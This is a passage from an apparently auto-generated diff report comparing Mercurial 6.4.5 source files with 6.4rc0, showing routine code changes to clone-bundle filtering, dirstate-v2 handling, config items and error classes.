-):
+def filterclonebundleentries(repo, entries, streamclonerequested=False):
     """Remove incompatible clone bundle manifest entries.
 
     Accepts a list of entries parsed with ``parseclonebundlesmanifest``
     and returns a new list consisting of only the entries that this client
     should be able to apply.
 
     There is no guarantee we'll be able to apply all returned entries because
     the metadata we use to filter on may be missing or wrong.
     """
     newentries = []
     for entry in entries:
-        url = entry.get(b'URL')
-        if not pullbundles and not any(
-            [url.startswith(scheme) for scheme in SUPPORTED_CLONEBUNDLE_SCHEMES]
-        ):
-            repo.ui.debug(
-                b'filtering %s because not a supported clonebundle scheme\n'
-                % url
-            )
-            continue
-
         spec = entry.get(b'BUNDLESPEC')
         if spec:
             try:
                 bundlespec = parsebundlespec(repo, spec, strict=True)
 
                 # If a stream clone was requested, filter out non-streamclone
                 # entries.
                 if streamclonerequested and not isstreamclonespec(bundlespec):
                     repo.ui.debug(
-                        b'filtering %s because not a stream clone\n' % url
+                        b'filtering %s because not a stream clone\n'
+                        % entry[b'URL']
                     )
                     continue
 
             except error.InvalidBundleSpecification as e:
                 repo.ui.debug(stringutil.forcebytestr(e) + b'\n')
                 continue
             except error.UnsupportedBundleSpecification as e:
                 repo.ui.debug(
                     b'filtering %s because unsupported bundle '
-                    b'spec: %s\n' % (url, stringutil.forcebytestr(e))
+                    b'spec: %s\n' % (entry[b'URL'], stringutil.forcebytestr(e))
                 )
                 continue
         # If we don't have a spec and requested a stream clone, we don't know
         # what the entry is so don't attempt to apply it.
         elif streamclonerequested:
             repo.ui.debug(
                 b'filtering %s because cannot determine if a stream '
-                b'clone bundle\n' % url
+                b'clone bundle\n' % entry[b'URL']
             )
             continue
 
         if b'REQUIRESNI' in entry and not sslutil.hassni:
-            repo.ui.debug(b'filtering %s because SNI not supported\n' % url)
+            repo.ui.debug(
+                b'filtering %s because SNI not supported\n' % entry[b'URL']
+            )
             continue
 
         if b'REQUIREDRAM' in entry:
             try:
                 requiredram = util.sizetoint(entry[b'REQUIREDRAM'])
             except error.ParseError:
                 repo.ui.debug(
-                    b'filtering %s due to a bad REQUIREDRAM attribute\n' % url
+                    b'filtering %s due to a bad REQUIREDRAM attribute\n'
+                    % entry[b'URL']
                 )
                 continue
             actualram = repo.ui.estimatememory()
             if actualram is not None and actualram * 0.66 < requiredram:
                 repo.ui.debug(
                     b'filtering %s as it needs more than 2/3 of system memory\n'
-                    % url
+                    % entry[b'URL']
                 )
                 continue
 
         newentries.append(entry)
 
     return newentries
```

### Comparing `mercurial-6.4.5/mercurial/bundlerepo.py` & `mercurial-6.4rc0/mercurial/bundlerepo.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cacheutil.py` & `mercurial-6.4rc0/mercurial/cacheutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/base85.c` & `mercurial-6.4rc0/mercurial/cext/base85.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/bdiff.c` & `mercurial-6.4rc0/mercurial/cext/bdiff.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/charencode.c` & `mercurial-6.4rc0/mercurial/cext/charencode.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/charencode.h` & `mercurial-6.4rc0/mercurial/cext/charencode.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/dirs.c` & `mercurial-6.4rc0/mercurial/cext/dirs.c`

 * *Files 2% similar despite different names*

```diff
@@ -9,19 +9,15 @@
 
 #define PY_SSIZE_T_CLEAN
 #include <Python.h>
 #include <string.h>
 
 #include "util.h"
 
-#if PY_VERSION_HEX >= 0x030C00A5
-#define PYLONG_VALUE(o) ((PyLongObject *)o)->long_value.ob_digit[0]
-#else
 #define PYLONG_VALUE(o) ((PyLongObject *)o)->ob_digit[0]
-#endif
 
 /*
  * This is a multiset of directory names, built from the files that
  * appear in a dirstate or manifest.
  *
  * A few implementation notes:
  *
```

### Comparing `mercurial-6.4.5/mercurial/cext/manifest.c` & `mercurial-6.4rc0/mercurial/cext/manifest.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/mpatch.c` & `mercurial-6.4rc0/mercurial/cext/mpatch.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/osutil.c` & `mercurial-6.4rc0/mercurial/cext/osutil.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/osutil.pyi` & `mercurial-6.4rc0/mercurial/cext/osutil.pyi`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/parsers.c` & `mercurial-6.4rc0/mercurial/cext/parsers.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/parsers.pyi` & `mercurial-6.4rc0/mercurial/cext/parsers.pyi`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/pathencode.c` & `mercurial-6.4rc0/mercurial/cext/pathencode.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/revlog.c` & `mercurial-6.4rc0/mercurial/cext/revlog.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cext/util.h` & `mercurial-6.4rc0/mercurial/cext/util.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cffi/bdiff.py` & `mercurial-6.4rc0/mercurial/cffi/bdiff.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cffi/bdiffbuild.py` & `mercurial-6.4rc0/mercurial/cffi/bdiffbuild.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cffi/mpatch.py` & `mercurial-6.4rc0/mercurial/cffi/mpatch.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cffi/mpatchbuild.py` & `mercurial-6.4rc0/mercurial/cffi/mpatchbuild.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cffi/osutil.py` & `mercurial-6.4rc0/mercurial/cffi/osutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cffi/osutilbuild.py` & `mercurial-6.4rc0/mercurial/cffi/osutilbuild.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/changegroup.py` & `mercurial-6.4rc0/mercurial/changegroup.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/changelog.py` & `mercurial-6.4rc0/mercurial/changelog.py`

 * *Files 1% similar despite different names*

```diff
@@ -477,15 +477,15 @@
         elif self._delaybuf:
             fp = self.opener(self._indexfile, b'a', checkambig=True)
             fp.write(b"".join(self._delaybuf))
             fp.close()
             self._delaybuf = None
         self._divert = False
         # split when we're done
-        self._enforceinlinesize(tr, side_write=False)
+        self._enforceinlinesize(tr)
 
     def _writepending(self, tr):
         """create a file containing the unfinalized state for
         pretxnchangegroup"""
         if self._docket:
             return self._docket.write(tr, pending=True)
         if self._delaybuf:
@@ -508,17 +508,17 @@
             self._segmentfile_sidedata.opener = self.opener
 
         if self._divert:
             return True
 
         return False
 
-    def _enforceinlinesize(self, tr, side_write=True):
+    def _enforceinlinesize(self, tr):
         if not self._delayed:
-            revlog.revlog._enforceinlinesize(self, tr, side_write=side_write)
+            revlog.revlog._enforceinlinesize(self, tr)
 
     def read(self, nodeorrev):
         """Obtain data from a parsed changelog revision.
 
         Returns a 6-tuple of:
 
            - manifest node in binary
```

### Comparing `mercurial-6.4.5/mercurial/chgserver.py` & `mercurial-6.4rc0/mercurial/chgserver.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/cmdutil.py` & `mercurial-6.4rc0/mercurial/cmdutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/color.py` & `mercurial-6.4rc0/mercurial/color.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/commands.py` & `mercurial-6.4rc0/mercurial/commands.py`

 * *Files 0% similar despite different names*

```diff
@@ -2494,15 +2494,15 @@
 
     This command takes effect with the next commit by default.
 
     Returns 0 on success, 1 if errors are encountered.
     """
     opts = pycompat.byteskwargs(opts)
 
-    context = lambda repo: repo.dirstate.changing_files(repo)
+    context = repo.dirstate.changing_files
     rev = opts.get(b'at_rev')
     ctx = None
     if rev:
         ctx = logcmdutil.revsingle(repo, rev)
         if ctx.rev() is not None:
 
             def context(repo):
@@ -5210,16 +5210,19 @@
         fm.startitem()
         fm.condwrite(not search, b'name', namefmt, name)
         fm.condwrite(not ui.quiet, b'url', b'%s\n', hidepassword(path.rawloc))
         for subopt, value in sorted(path.suboptions.items()):
             assert subopt not in (b'name', b'url')
             if showsubopts:
                 fm.plain(b'%s:%s = ' % (name, subopt))
-            display = urlutil.path_suboptions_display[subopt]
-            value = display(value)
+            if isinstance(value, bool):
+                if value:
+                    value = b'yes'
+                else:
+                    value = b'no'
             fm.condwrite(showsubopts, subopt, b'%s\n', value)
 
     fm.end()
 
     if search and not pathitems:
         if not ui.quiet:
             ui.warn(_(b"not found!\n"))
@@ -6005,15 +6008,15 @@
     the same way as :hg:`copy --forget`.
 
     This command takes effect with the next commit by default.
 
     Returns 0 on success, 1 if errors are encountered.
     """
     opts = pycompat.byteskwargs(opts)
-    context = lambda repo: repo.dirstate.changing_files(repo)
+    context = repo.dirstate.changing_files
     rev = opts.get(b'at_rev')
     ctx = None
     if rev:
         ctx = logcmdutil.revsingle(repo, rev)
         if ctx.rev() is not None:
 
             def context(repo):
@@ -6595,15 +6598,15 @@
             b'cmdserver',
             b'',
             _(b'for remote clients (ADVANCED)'),
             _(b'MODE'),
         ),
         (b't', b'templates', b'', _(b'web templates to use'), _(b'TEMPLATE')),
         (b'', b'style', b'', _(b'template style to use'), _(b'STYLE')),
-        (b'6', b'ipv6', None, _(b'use IPv6 instead of IPv4')),
+        (b'6', b'ipv6', None, _(b'use IPv6 in addition to IPv4')),
         (b'', b'certificate', b'', _(b'SSL certificate file'), _(b'FILE')),
         (b'', b'print-url', None, _(b'start and print only the URL')),
     ]
     + subrepoopts,
     _(b'[OPTION]...'),
     helpcategory=command.CATEGORY_REMOTE_REPO_MANAGEMENT,
     helpbasic=True,
```

### Comparing `mercurial-6.4.5/mercurial/commandserver.py` & `mercurial-6.4rc0/mercurial/commandserver.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/commit.py` & `mercurial-6.4rc0/mercurial/commit.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/compat.h` & `mercurial-6.4rc0/mercurial/compat.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/config.py` & `mercurial-6.4rc0/mercurial/config.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/configitems.py` & `mercurial-6.4rc0/mercurial/configitems.py`

 * *Files 1% similar despite different names*

```diff
@@ -612,18 +612,14 @@
     default=False,
 )
 coreconfigitem(
     b'devel',
     b'bundle2.debug',
     default=False,
 )
-# which kind of delta to put in the bundled changegroup. Possible value
-# - '': use default behavior
-# - p1: force to always use delta against p1
-# - full: force to always use full content
 coreconfigitem(
     b'devel',
     b'bundle.delta',
     default=b'',
 )
 coreconfigitem(
     b'devel',
@@ -688,19 +684,17 @@
     default=False,
 )
 coreconfigitem(
     b'devel',
     b'servercafile',
     default=b'',
 )
-# This config option is intended for use in tests only. It is a giant
-# footgun to kill security. Don't define it.
 coreconfigitem(
     b'devel',
-    b'server-insecure-exact-protocol',
+    b'serverexactprotocol',
     default=b'',
 )
 coreconfigitem(
     b'devel',
     b'serverrequirecert',
     default=False,
 )
```

### Comparing `mercurial-6.4.5/mercurial/context.py` & `mercurial-6.4rc0/mercurial/context.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/copies.py` & `mercurial-6.4rc0/mercurial/copies.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/crecord.py` & `mercurial-6.4rc0/mercurial/crecord.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/dagop.py` & `mercurial-6.4rc0/mercurial/dagop.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/dagparser.py` & `mercurial-6.4rc0/mercurial/dagparser.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/debugcommands.py` & `mercurial-6.4rc0/mercurial/debugcommands.py`

 * *Files 0% similar despite different names*

```diff
@@ -799,20 +799,19 @@
     length = r.length
     generaldelta = r._generaldelta
     withsparseread = getattr(r, '_withsparseread', False)
 
     # security to avoid crash on corrupted revlogs
     total_revs = len(index)
 
-    chain_size_cache = {}
-
     def revinfo(rev):
         e = index[rev]
         compsize = e[revlog_constants.ENTRY_DATA_COMPRESSED_LENGTH]
         uncompsize = e[revlog_constants.ENTRY_DATA_UNCOMPRESSED_LENGTH]
+        chainsize = 0
 
         base = e[revlog_constants.ENTRY_DELTA_BASE]
         p1 = e[revlog_constants.ENTRY_PARENT_1]
         p2 = e[revlog_constants.ENTRY_PARENT_2]
 
         # If the parents of a revision has an empty delta, we never try to delta
         # against that parent, but directly against the delta base of that
@@ -867,25 +866,19 @@
         else:
             if base == rev:
                 deltatype = b'base'
             else:
                 deltatype = b'prev'
 
         chain = r._deltachain(rev)[0]
-        chain_size = 0
-        for iter_rev in reversed(chain):
-            cached = chain_size_cache.get(iter_rev)
-            if cached is not None:
-                chain_size += cached
-                break
-            e = index[iter_rev]
-            chain_size += e[revlog_constants.ENTRY_DATA_COMPRESSED_LENGTH]
-        chain_size_cache[rev] = chain_size
+        for iterrev in chain:
+            e = index[iterrev]
+            chainsize += e[revlog_constants.ENTRY_DATA_COMPRESSED_LENGTH]
 
-        return p1, p2, compsize, uncompsize, deltatype, chain, chain_size
+        return p1, p2, compsize, uncompsize, deltatype, chain, chainsize
 
     fm = ui.formatter(b'debugdeltachain', opts)
 
     fm.plain(
         b'    rev      p1      p2  chain# chainlen     prev   delta       '
         b'size    rawsize  chainsize     ratio   lindist extradist '
         b'extraratio'
@@ -2133,15 +2126,15 @@
             [e.name() for e in wirecompengines if e.wireprotosupport()],
             name=b'compengine',
             fmt=b'%s',
             sep=b', ',
         ),
     )
     re2 = b'missing'
-    if util.has_re2():
+    if util._re2:
         re2 = b'available'
     fm.plain(_(b'checking "re2" regexp engine (%s)\n') % re2)
     fm.data(re2=bool(util._re2))
 
     # templates
     p = templater.templatedir()
     fm.write(b'templatedirs', b'checking templates (%s)...\n', p or b'')
```

### Comparing `mercurial-6.4.5/mercurial/defaultrc/mergetools.rc` & `mercurial-6.4rc0/mercurial/defaultrc/mergetools.rc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/destutil.py` & `mercurial-6.4rc0/mercurial/destutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/diffhelper.py` & `mercurial-6.4rc0/mercurial/diffhelper.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/diffutil.py` & `mercurial-6.4rc0/mercurial/diffutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/dirstate.py` & `mercurial-6.4rc0/mercurial/dirstate.py`

 * *Files 1% similar despite different names*

```diff
@@ -196,20 +196,14 @@
         self._mapcls = dirstatemap.dirstatemap
         # Access and cache cwd early, so we don't access it for the first time
         # after a working-copy update caused it to not exist (accessing it then
         # raises an exception).
         self._cwd
 
     def refresh(self):
-        # XXX if this happens, you likely did not enter the `changing_xxx`
-        # using `repo.dirstate`, so a later `repo.dirstate` accesss might call
-        # `refresh`.
-        if self.is_changing_any:
-            msg = "refreshing the dirstate in the middle of a change"
-            raise error.ProgrammingError(msg)
         if '_branch' in vars(self):
             del self._branch
         if '_map' in vars(self) and self._map.may_need_refresh():
             self.invalidate()
 
     def prefetch_parents(self):
         """make sure the parents are loaded
```

### Comparing `mercurial-6.4.5/mercurial/dirstatemap.py` & `mercurial-6.4rc0/mercurial/dirstatemap.py`

 * *Files 7% similar despite different names*

```diff
@@ -1,14 +1,13 @@
 # dirstatemap.py
 #
 # This software may be used and distributed according to the terms of the
 # GNU General Public License version 2 or any later version.
 
 
-import struct
 from .i18n import _
 
 from . import (
     error,
     pathutil,
     policy,
     testing,
@@ -148,23 +147,17 @@
     def docket(self):
         if not self._docket:
             if not self._use_dirstate_v2:
                 raise error.ProgrammingError(
                     b'dirstate only has a docket in v2 format'
                 )
             self._set_identity()
-            try:
-                self._docket = docketmod.DirstateDocket.parse(
-                    self._readdirstatefile(), self._nodeconstants
-                )
-            except struct.error:
-                self._ui.debug(b"failed to read dirstate-v2 data")
-                raise error.CorruptedDirstate(
-                    b"failed to read dirstate-v2 data"
-                )
+            self._docket = docketmod.DirstateDocket.parse(
+                self._readdirstatefile(), self._nodeconstants
+            )
         return self._docket
 
     def _read_v2_data(self):
         data = None
         attempts = 0
         while attempts < V2_MAX_READ_ATTEMPTS:
             attempts += 1
@@ -179,45 +172,33 @@
             assert attempts >= V2_MAX_READ_ATTEMPTS
             msg = b"dirstate read race happened %d times in a row"
             msg %= attempts
             raise error.Abort(msg)
         return self._opener.read(self.docket.data_filename())
 
     def write_v2_no_append(self, tr, st, meta, packed):
-        try:
-            old_docket = self.docket
-        except error.CorruptedDirstate:
-            # This means we've identified a dirstate-v1 file on-disk when we
-            # were expecting a dirstate-v2 docket. We've managed to recover
-            # from that unexpected situation, and now we want to write back a
-            # dirstate-v2 file to make the on-disk situation right again.
-            #
-            # This shouldn't be triggered since `self.docket` is cached and
-            # we would have called parents() or read() first, but it's here
-            # just in case.
-            old_docket = None
-
+        old_docket = self.docket
         new_docket = docketmod.DirstateDocket.with_new_uuid(
             self.parents(), len(packed), meta
         )
-        if old_docket is not None and old_docket.uuid == new_docket.uuid:
+        if old_docket.uuid == new_docket.uuid:
             raise error.ProgrammingError(b'dirstate docket name collision')
         data_filename = new_docket.data_filename()
         self._opener.write(data_filename, packed)
         # tell the transaction that we are adding a new file
         if tr is not None:
             tr.addbackup(data_filename, location=b'plain')
         # Write the new docket after the new data file has been
         # written. Because `st` was opened with `atomictemp=True`,
         # the actual `.hg/dirstate` file is only affected on close.
         st.write(new_docket.serialize())
         st.close()
         # Remove the old data file after the new docket pointing to
         # the new data file was written.
-        if old_docket is not None and old_docket.uuid:
+        if old_docket.uuid:
             data_filename = old_docket.data_filename()
             if tr is not None:
                 tr.addbackup(data_filename, location=b'plain')
             unlink = lambda _tr=None: self._opener.unlink(data_filename)
             if tr:
                 category = b"dirstate-v2-clean-" + old_docket.uuid
                 tr.addpostclose(category, unlink)
@@ -226,48 +207,36 @@
         self._docket = new_docket
 
     ### reading/setting parents
 
     def parents(self):
         if not self._parents:
             if self._use_dirstate_v2:
-                try:
-                    self.docket
-                except error.CorruptedDirstate as e:
-                    # fall back to dirstate-v1 if we fail to read v2
-                    self._v1_parents(e)
-                else:
-                    self._parents = self.docket.parents
+                self._parents = self.docket.parents
             else:
-                self._v1_parents()
+                read_len = self._nodelen * 2
+                st = self._readdirstatefile(read_len)
+                l = len(st)
+                if l == read_len:
+                    self._parents = (
+                        st[: self._nodelen],
+                        st[self._nodelen : 2 * self._nodelen],
+                    )
+                elif l == 0:
+                    self._parents = (
+                        self._nodeconstants.nullid,
+                        self._nodeconstants.nullid,
+                    )
+                else:
+                    raise error.Abort(
+                        _(b'working directory state appears damaged!')
+                    )
 
         return self._parents
 
-    def _v1_parents(self, from_v2_exception=None):
-        read_len = self._nodelen * 2
-        st = self._readdirstatefile(read_len)
-        l = len(st)
-        if l == read_len:
-            self._parents = (
-                st[: self._nodelen],
-                st[self._nodelen : 2 * self._nodelen],
-            )
-        elif l == 0:
-            self._parents = (
-                self._nodeconstants.nullid,
-                self._nodeconstants.nullid,
-            )
-        else:
-            hint = None
-            if from_v2_exception is not None:
-                hint = _(b"falling back to dirstate-v1 from v2 also failed")
-            raise error.Abort(
-                _(b'working directory state appears damaged!'), hint
-            )
-
 
 class dirstatemap(_dirstatemapcommon):
     """Map encapsulating the dirstate's contents.
 
     The dirstate contains the following state:
 
     - `identity` is the identity of the dirstate file, which can be used to
@@ -357,25 +326,19 @@
         return copies
 
     ### disk interaction
 
     def read(self):
         testing.wait_on_cfg(self._ui, b'dirstate.pre-read-file')
         if self._use_dirstate_v2:
-            try:
-                self.docket
-            except error.CorruptedDirstate:
-                # fall back to dirstate-v1 if we fail to read v2
-                self._set_identity()
-                st = self._readdirstatefile()
-            else:
-                if not self.docket.uuid:
-                    return
-                testing.wait_on_cfg(self._ui, b'dirstate.post-docket-read-file')
-                st = self._read_v2_data()
+
+            if not self.docket.uuid:
+                return
+            testing.wait_on_cfg(self._ui, b'dirstate.post-docket-read-file')
+            st = self._read_v2_data()
         else:
             self._set_identity()
             st = self._readdirstatefile()
 
         if not st:
             return
 
@@ -398,25 +361,18 @@
         # into. This means that O(number of files) GCs are unavoidable.
         # Depending on when in the process's lifetime the dirstate is parsed,
         # this can get very expensive. As a workaround, disable GC while
         # parsing the dirstate.
         #
         # (we cannot decorate the function directly since it is in a C module)
         if self._use_dirstate_v2:
-            try:
-                self.docket
-            except error.CorruptedDirstate:
-                # fall back to dirstate-v1 if we fail to parse v2
-                parse_dirstate = util.nogc(parsers.parse_dirstate)
-                p = parse_dirstate(self._map, self.copymap, st)
-            else:
-                p = self.docket.parents
-                meta = self.docket.tree_metadata
-                parse_dirstate = util.nogc(v2.parse_dirstate)
-                parse_dirstate(self._map, self.copymap, st, meta)
+            p = self.docket.parents
+            meta = self.docket.tree_metadata
+            parse_dirstate = util.nogc(v2.parse_dirstate)
+            parse_dirstate(self._map, self.copymap, st, meta)
         else:
             parse_dirstate = util.nogc(parsers.parse_dirstate)
             p = parse_dirstate(self._map, self.copymap, st)
         if not self._dirtyparents:
             self.setparents(*p)
 
         # Avoid excess attribute lookups by fast pathing certain checks
@@ -637,71 +593,55 @@
             Fills the Dirstatemap when called.
             """
             # ignore HG_PENDING because identity is used only for writing
             self._set_identity()
 
             testing.wait_on_cfg(self._ui, b'dirstate.pre-read-file')
             if self._use_dirstate_v2:
-                try:
-                    self.docket
-                except error.CorruptedDirstate as e:
-                    # fall back to dirstate-v1 if we fail to read v2
-                    parents = self._v1_map(e)
+                self.docket  # load the data if needed
+                inode = (
+                    self.identity.stat.st_ino
+                    if self.identity is not None
+                    and self.identity.stat is not None
+                    else None
+                )
+                testing.wait_on_cfg(self._ui, b'dirstate.post-docket-read-file')
+                if not self.docket.uuid:
+                    data = b''
+                    self._map = rustmod.DirstateMap.new_empty()
                 else:
-                    parents = self.docket.parents
-                    inode = (
-                        self.identity.stat.st_ino
-                        if self.identity is not None
-                        and self.identity.stat is not None
-                        else None
-                    )
-                    testing.wait_on_cfg(
-                        self._ui, b'dirstate.post-docket-read-file'
+                    data = self._read_v2_data()
+                    self._map = rustmod.DirstateMap.new_v2(
+                        data,
+                        self.docket.data_size,
+                        self.docket.tree_metadata,
+                        self.docket.uuid,
+                        inode,
                     )
-                    if not self.docket.uuid:
-                        data = b''
-                        self._map = rustmod.DirstateMap.new_empty()
-                    else:
-                        data = self._read_v2_data()
-                        self._map = rustmod.DirstateMap.new_v2(
-                            data,
-                            self.docket.data_size,
-                            self.docket.tree_metadata,
-                            self.docket.uuid,
-                            inode,
-                        )
-                    parents = self.docket.parents
+                parents = self.docket.parents
             else:
-                parents = self._v1_map()
+                self._set_identity()
+                inode = (
+                    self.identity.stat.st_ino
+                    if self.identity is not None
+                    and self.identity.stat is not None
+                    else None
+                )
+                self._map, parents = rustmod.DirstateMap.new_v1(
+                    self._readdirstatefile(), inode
+                )
 
             if parents and not self._dirtyparents:
                 self.setparents(*parents)
 
             self.__contains__ = self._map.__contains__
             self.__getitem__ = self._map.__getitem__
             self.get = self._map.get
             return self._map
 
-        def _v1_map(self, from_v2_exception=None):
-            self._set_identity()
-            inode = (
-                self.identity.stat.st_ino
-                if self.identity is not None and self.identity.stat is not None
-                else None
-            )
-            try:
-                self._map, parents = rustmod.DirstateMap.new_v1(
-                    self._readdirstatefile(), inode
-                )
-            except OSError as e:
-                if from_v2_exception is not None:
-                    raise e from from_v2_exception
-                raise
-            return parents
-
         @property
         def copymap(self):
             return self._map.copymap()
 
         def debug_iter(self, all):
             """
             Return an iterator of (filename, state, mode, size, mtime) tuples
@@ -752,23 +692,17 @@
                 p1, p2 = self.parents()
                 packed = self._map.write_v1(p1, p2)
                 st.write(packed)
                 st.close()
                 self._dirtyparents = False
                 return
 
-            write_mode = self._write_mode
-            try:
-                docket = self.docket
-            except error.CorruptedDirstate:
-                # fall back to dirstate-v1 if we fail to parse v2
-                docket = None
-
             # We can only append to an existing data file if there is one
-            if docket is None or docket.uuid is None:
+            write_mode = self._write_mode
+            if self.docket.uuid is None:
                 write_mode = WRITE_MODE_FORCE_NEW
             packed, meta, append = self._map.write_v2(write_mode)
             if append:
                 docket = self.docket
                 data_filename = docket.data_filename()
                 # We mark it for backup to make sure a future `hg rollback` (or
                 # `hg recover`?) call find the data it needs to restore a
```

### Comparing `mercurial-6.4.5/mercurial/dirstateutils/docket.py` & `mercurial-6.4rc0/mercurial/dirstateutils/docket.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/dirstateutils/timestamp.py` & `mercurial-6.4rc0/mercurial/dirstateutils/timestamp.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/dirstateutils/v2.py` & `mercurial-6.4rc0/mercurial/dirstateutils/v2.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/discovery.py` & `mercurial-6.4rc0/mercurial/discovery.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/dispatch.py` & `mercurial-6.4rc0/mercurial/dispatch.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/dummycert.pem` & `mercurial-6.4rc0/mercurial/dummycert.pem`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/encoding.py` & `mercurial-6.4rc0/mercurial/encoding.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/error.py` & `mercurial-6.4rc0/mercurial/error.py`

 * *Files 1% similar despite different names*

```diff
@@ -151,15 +151,15 @@
     pass
 
 
 class CommandError(Exception):
     """Exception raised on errors in parsing the command line."""
 
     def __init__(self, command, message):
-        # type: (Optional[bytes], bytes) -> None
+        # type: (bytes, bytes) -> None
         self.command = command
         self.message = message
         super(CommandError, self).__init__()
 
     __bytes__ = _tobytes
 
 
@@ -646,21 +646,14 @@
 
 class CorruptedState(Exception):
     """error raised when a command is not able to read its state from file"""
 
     __bytes__ = _tobytes
 
 
-class CorruptedDirstate(Exception):
-    """error raised the dirstate appears corrupted on-disk. It may be due to
-    a dirstate version mismatch (i.e. expecting v2 and finding v1 on disk)."""
-
-    __bytes__ = _tobytes
-
-
 class PeerTransportError(Abort):
     """Transport-level I/O error when communicating with a peer repo."""
 
 
 class InMemoryMergeConflictsError(Exception):
     """Exception raised when merge conflicts arose during an in-memory merge."""
```

### Comparing `mercurial-6.4.5/mercurial/exchange.py` & `mercurial-6.4rc0/mercurial/exchange.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/exewrapper.c` & `mercurial-6.4rc0/mercurial/exewrapper.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/extensions.py` & `mercurial-6.4rc0/mercurial/extensions.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/exthelper.py` & `mercurial-6.4rc0/mercurial/exthelper.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/fancyopts.py` & `mercurial-6.4rc0/mercurial/fancyopts.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/filelog.py` & `mercurial-6.4rc0/mercurial/filelog.py`

 * *Files 2% similar despite different names*

```diff
@@ -21,23 +21,22 @@
     constants as revlog_constants,
     rewrite,
 )
 
 
 @interfaceutil.implementer(repository.ifilestorage)
 class filelog:
-    def __init__(self, opener, path, try_split=False):
+    def __init__(self, opener, path):
         self._revlog = revlog.revlog(
             opener,
             # XXX should use the unencoded path
             target=(revlog_constants.KIND_FILELOG, path),
             radix=b'/'.join((b'data', path)),
             censorable=True,
             canonical_parent_order=False,  # see comment in revlog.py
-            try_split=try_split,
         )
         # Full name of the user visible file, relative to the repository root.
         # Used by LFS.
         self._revlog.filename = path
         self.nullid = self._revlog.nullid
         opts = opener.options
         self._fix_issue6528 = opts.get(b'issue6528.fix-incoming', True)
@@ -253,16 +252,16 @@
 
         return self._revlog.clone(tr, destrevlog._revlog, **kwargs)
 
 
 class narrowfilelog(filelog):
     """Filelog variation to be used with narrow stores."""
 
-    def __init__(self, opener, path, narrowmatch, try_split=False):
-        super(narrowfilelog, self).__init__(opener, path, try_split=try_split)
+    def __init__(self, opener, path, narrowmatch):
+        super(narrowfilelog, self).__init__(opener, path)
         self._narrowmatch = narrowmatch
 
     def renamed(self, node):
         res = super(narrowfilelog, self).renamed(node)
 
         # Renames that come from outside the narrowspec are problematic
         # because we may lack the base text for the rename. This can result
```

### Comparing `mercurial-6.4.5/mercurial/filemerge.py` & `mercurial-6.4rc0/mercurial/filemerge.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/fileset.py` & `mercurial-6.4rc0/mercurial/fileset.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/filesetlang.py` & `mercurial-6.4rc0/mercurial/filesetlang.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/formatter.py` & `mercurial-6.4rc0/mercurial/formatter.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/graphmod.py` & `mercurial-6.4rc0/mercurial/graphmod.py`
